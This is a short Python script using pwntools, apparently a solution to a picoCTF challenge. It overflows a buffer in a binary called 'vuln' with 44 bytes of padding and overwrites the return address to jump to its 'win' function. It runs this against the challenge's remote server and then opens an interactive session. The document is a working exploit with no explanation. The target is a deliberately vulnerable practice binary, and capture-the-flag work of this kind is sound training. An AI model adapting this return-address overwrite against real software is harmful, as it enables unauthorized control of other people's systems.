from pwn import *

context.binary = elf = ELF('./vuln')

#io = process('./vuln')
#io = gdb.debug('./vuln')
io = remote("saturn.picoctf.net", 52209)

padding = b"A"*44

payload = padding + flat(elf.sym['win'], elf.sym['main'])

io.sendlineafter(b"string:",payload, timeout=1)

io.interactive()
